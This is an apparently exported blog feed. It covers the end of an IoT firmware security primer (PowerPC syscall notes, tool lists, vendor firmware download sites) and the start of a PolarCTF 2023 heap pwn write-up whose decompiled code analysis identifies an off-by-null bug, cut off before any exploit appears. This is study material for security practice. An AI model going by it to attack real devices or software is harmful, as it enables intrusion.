<h3 id="系统调用-3"><a href="#系统调用-3" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li><p>系统调用指令 sc</p>
</li>
<li><ul>
<li>指令的使用：</li>
<li><code>r0</code>为syscall调用号</li>
<li><code>r3</code>为参数一</li>
<li><code>r4</code>为参数二</li>
<li><code>r5</code>为参数三</li>
<li>在ppc中syscall使用<code>sc</code></li>
</ul>
<ul>
<li><ul>
<li>sc指令调用操作系统去执行服务程序。当控制返回到一个执行系统调用的程序时，寄存器的内容依赖于程序提供的系统所使用的寄存器的约定。</li>
</ul>
</li>
<li><ul>
<li>跟在sc指令后面的有效指令地址被放在SRR0中。MSR中的位0、5～9和16～31被放在SRR1中对应的位置，SRR1中位1～4和10～15被设置为未定义值。当sc异常产生，异常处理程序更改MSR寄存器。异常处理程序到MSR[IP]形成基址加0xC00偏移量形成的地址去取下一条指令。</li>
</ul>
</li>
<li><ul>
<li>受影响的寄存器有：依赖于系统服务、SRR0、SRR1及MSR。</li>
</ul>
</li>
</ul>
</li>
<li><p>中断返回指令rfi</p>
</li>
<li><ul>
<li>指令操作：</li>
</ul>
<ul>
<li><ul>
<li>MSR[16-23,25-27,30-31] &lt;—SRR1[16-23,25-27,30-31]</li>
</ul>
</li>
<li><ul>
<li>NIA&lt;—iea SRR0[0-29]||0b00</li>
</ul>
</li>
<li><ul>
<li>SRR1中的位0、5～9和16～31被放在MSR中对应的位置。如果新的MSR值没有使能任何未完的操作，则在MSR的控制下，从地址SRR0[0-29]_0b00取下一条指令。</li>
</ul>
</li>
<li><ul>
<li>指令的使用中受影响的寄存器为MSR。</li>
</ul>
</li>
<li><ul>
<li>实际上还有一些特殊的跳转指令rfi&#x2F;rfci&#x2F;rfmci，其目的地址保存在SRR0&#x2F;CSRR0&#x2F;MCSRR0中。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="栈帧结构-3"><a href="#栈帧结构-3" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><h1 id="异构Pwn"><a href="#异构Pwn" class="headerlink" title="异构Pwn"></a>异构Pwn</h1><p>可以看<a href="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Other%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/">另一篇文章的异构Pwn部分</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里不详细介绍了，装了好多东西，后面打算开源一个 <code>IoT</code> 环境相关的库。</p>
<ol>
<li><p>binwalk</p>
</li>
<li><p>firmAE</p>
</li>
<li><p>firmadyne</p>
</li>
<li><p>firmware-analysis-toolkit</p>
</li>
<li><p>qemu</p>
</li>
<li><p>firmwalker</p>
</li>
<li><p>……</p>
</li>
</ol>
<h1 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h1><ul>
<li><p>官网下载（有些存在加密，可以找一下中间版本，有可能存在解密脚本）</p>
</li>
<li><p>第三方网站</p>
</li>
<li><p>在线升级时抓取升级包的地址</p>
</li>
<li><p>售后获取</p>
</li>
<li><p>使用编程器从Flash中读取固件</p>
</li>
<li><p>通过调试接口，进入设备提取固件</p>
</li>
<li><p>使用逻辑分析仪获取固件</p>
</li>
<li><p>……</p>
</li>
</ul>
<p>一些固件的下载地址：</p>
<h2 id="DLink"><a href="#DLink" class="headerlink" title="DLink"></a><strong>DLink</strong></h2><p><a class="link"   href="https://tsd.dlink.com.tw/ddwn" >https://tsd.dlink.com.tw/ddwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br> <a class="link"   href="http://legacyfiles.us.dlink.com/" >http://legacyfiles.us.dlink.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Trendnet"><a href="#Trendnet" class="headerlink" title="Trendnet"></a><strong>Trendnet</strong></h2><p><a class="link"   href="http://download.trendnet.com/" >http://download.trendnet.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Tenda"><a href="#Tenda" class="headerlink" title="Tenda"></a><strong>Tenda</strong></h2><p><a class="link"   href="https://www.tendacn.com/products/routers.html" >https://www.tendacn.com/products/routers.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TotoLink"><a href="#TotoLink" class="headerlink" title="TotoLink"></a><strong>TotoLink</strong></h2><p><a class="link"   href="https://www.totolink.net/home/index/menu_listtpl/listtpl/prod/id/26.html" >https://www.totolink.net/home/index/menu_listtpl/listtpl/prod/id/26.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="http://totolink.cn/home/index/menu_listtpl.html?listtpl=prod&id=26" >http://totolink.cn/home/index/menu_listtpl.html?listtpl=prod&amp;id=26 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TP-Link"><a href="#TP-Link" class="headerlink" title="TP-Link"></a><strong>TP-Link</strong></h2><p><a class="link"   href="https://resource.tp-link.com.cn/?source=index" >https://resource.tp-link.com.cn/?source=index <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.tp-link.com/en/explore/wifi-router/" >https://www.tp-link.com/en/explore/wifi-router/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.tp-link.com.cn/" >https://www.tp-link.com.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Wavlink"><a href="#Wavlink" class="headerlink" title="Wavlink"></a><strong>Wavlink</strong></h2><p><a class="link"   href="https://www.wavlink.com/en_us/firmware.html" >https://www.wavlink.com/en_us/firmware.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a><strong>H3C</strong></h2><p><a class="link"   href="https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/" >https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Cisco"><a href="#Cisco" class="headerlink" title="Cisco"></a><strong>Cisco</strong></h2><p><a class="link"   href="https://software.cisco.com/download/home" >https://software.cisco.com/download/home <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="NETGEAR"><a href="#NETGEAR" class="headerlink" title="NETGEAR"></a><strong>NETGEAR</strong></h2><p><a class="link"   href="http://www.netgear.cn/" >http://www.netgear.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.netgear.com/support/download" >https://www.netgear.com/support/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="DrayTek"><a href="#DrayTek" class="headerlink" title="DrayTek"></a><strong>DrayTek</strong></h2><p><a class="link"   href="https://fw.draytek.com.tw/" >https://fw.draytek.com.tw/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.draytek.com/products/vpn-routers/" >https://www.draytek.com/products/vpn-routers/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="锐捷"><a href="#锐捷" class="headerlink" title="锐捷"></a><strong>锐捷</strong></h2><p><a class="link"   href="https://www.ruijie.com.cn/fw/rj/" >https://www.ruijie.com.cn/fw/rj/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.ruijienetworks.com/resources/products/1896-1897" >https://www.ruijienetworks.com/resources/products/1896-1897 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="萤石"><a href="#萤石" class="headerlink" title="萤石"></a><strong>萤石</strong></h2><p><a class="link"   href="https://service.ezviz.com/download" >https://service.ezviz.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="小米"><a href="#小米" class="headerlink" title="小米"></a><strong>小米</strong></h2><p><a class="link"   href="http://miwifi.com/miwifi_download.html" >http://miwifi.com/miwifi_download.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="ASUS"><a href="#ASUS" class="headerlink" title="ASUS"></a><strong>ASUS</strong></h2><p><a class="link"   href="https://www.asus.com.cn/support/" >https://www.asus.com.cn/support/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h1><p>也不在这里也不细讲了。</p>
<ul>
<li>binwalk -Mer</li>
<li>unsquashfs </li>
<li>dd</li>
<li>strings 查看信息</li>
<li>file</li>
<li>hexdump</li>
<li>fdisk</li>
<li>……</li>
</ul>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-Start</tag>
      </tags>
  </entry>
  <entry>
    <title>PolarCTF2023秋赛:夕阳下的舞者</title>
    <url>/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/</url>
    <content><![CDATA[<h1 id="562-5Liq5Yiw"><a href="#562-5Liq5Yiw" class="headerlink" title="562+5Liq5Yiw"></a>562+5Liq5Yiw</h1><h2 id="检查文件信息"><a href="#检查文件信息" class="headerlink" title="检查文件信息"></a>检查文件信息</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180215833.png"
                      alt="image-20230911180215833"
                ></p>
<p><code>ELF64</code>位小端序程序，动态链接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911180407139.png"
                      alt="image-20230911180407139"
                ></p>
<p>除了<code>FODRTIFY</code>保护，其余保护全开。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./562+5Liq5Yiw</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so ./562+5Liq5Yiw</span><br></pre></td></tr></table></figure></div>

<p>将环境修改为题目的运行环境。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_A9D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Welcome to Chicken farm!!! \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Delete a Chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Cook a chicken.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Chicken you are so beautiful.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.EXIT.&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_A9D()</code>函数为程序菜单。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_A50</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;==:.........................................................................=..::::..=:::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===-:.......................................................................=..=-:=:.=:.:::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=====-......................................................................=..-:.=:.=:..::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;=======:.........................................:..........................=..:--=..=:...:::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;========-:......................................:-=++-......................=..=.:=..=:....::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;==========-....................................:+**###+:....................=-::-----=:......::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;===========-...............................:--:.+######=....................=.-:-:-:.=:.......:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:-=========-.............................:+###*:*#+#+*=:...................:=.---:--.=:........::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::-=======-............................:######:####+-......................-::::.::.=:.........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::--=====-...........................:#++####=+####:.......................:--------..........:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::--===-...........................#++++++#*-#++##:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::-==-..........................*++++++++#:+++++*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::--..........................+++++++++#++#++++-.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::..........................#++++++++#++#++++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::.........................=+++++++#+++##+++=.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..:::::::::::::........................*+++++#++++++#++:.........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....:::::::::::::.......................#++++#=++++++#*..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......:::::::::::::.....................++*##**#++++#=:..........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........:::::::::::::..................-==++++++*##*=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........:::::::::::::................-======+==+++..............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...........:::::::::::::..............-===+++++++++-.............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.............:::::::::::::...........:===++++++++++=:............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...............:::::::::::::.........===++*+-=***+++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;................::::::::::::::......-=+++*=...-*++++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..................:::::::::::::....-==+++-.....=++++=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....................:::::::::::::..==+++-.......+++++-...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......................::::::::::::-=++*=........:*+++=...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........................::::::::::=+++-..........:+*++-.........................................:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........................::::::::-==+=:...........:+===........................................::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::.......................:::::-==++::::..........====:......................................:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::----===+=::::::::::::::-+==-:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-==++:::::::::::::::-+===::::::::::::::::::::::::::::::::::::-----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-=++-::::::::::::::::+===:::::::::::::::::::::::::::::::::::::----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::=++=:::::::::::::::::====:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::-+++::::::::::::::::::-+++::::::::::::::::::::::::::::::::::::::::-\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::+#+:::::::::::::::::::::*#-::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::##+:::::::::::::::::::::*#*::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::-*###:::::::::::::::::::::###+:::::::::::::::::::::::::::::::::::::::&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="built_in">sub_A9D</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">sub_BFC</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">sub_D28</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_EB3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_1005</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到是一道菜单题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_BFC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">sub_B34</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken nest collapsed!!! \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">1</span>) = <span class="built_in">malloc</span>(*v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">3</span>) = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">2</span>) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_B74</span>(*((_QWORD *)v2 + <span class="number">1</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="type">void</span> **)v2 + <span class="number">2</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">    dword_203060[v1] = <span class="number">1</span>;</span><br><span class="line">    qword_203080[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BFC()</code>函数创建了一个结构体，并且可以自定义<code>chicken</code>大小。数组<code>qword_203080</code>记录了每一个<code>chicken</code>,数组<code>dword_203060</code>记录了<code>qword_203060</code>的使用情况。可以向<code>mark</code>和<code>name</code>读入内容。并且未将<code>v2+3</code>处的内容初始化，可能存在泄露。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="type">void</span>* name;</span><br><span class="line">	<span class="type">void</span>* mark;</span><br><span class="line">	<span class="type">void</span>* msg; <span class="comment">// 后面分析得知，这里记载的菜名。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>根据读入情况，不难分析出结构体的内容。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B34</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_203060[i] )</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B34()</code>函数用于查看<code>qword_203060</code>数组的使用情况。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">sub_B74</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, a1, a2);</span><br><span class="line">  result = &amp;a1[a2];</span><br><span class="line">  *result &amp;= ~<span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B74()</code>函数置零操作存在<code>off-by-null</code>漏洞。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D28</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)qword_203080[v1] = <span class="number">0</span>;</span><br><span class="line">    dword_203060[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">8LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">16LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">24LL</span>));</span><br><span class="line">    qword_203080[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken has already been cooked. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_D28()</code>函数用于释放多块，没有问题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EB3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Old name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me new name.&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>), *(<span class="type">int</span> *)qword_203080[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;New name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me Cook name.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_BC0</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m Ni gun ma i u. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_EB3()</code>函数用于改名字，并记录菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">sub_BC0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[a1] + <span class="number">24LL</span>), <span class="number">0x80</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BC0()</code>函数用于读取菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1005</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The chicken %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    <span class="keyword">if</span> ( dword_203060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Name 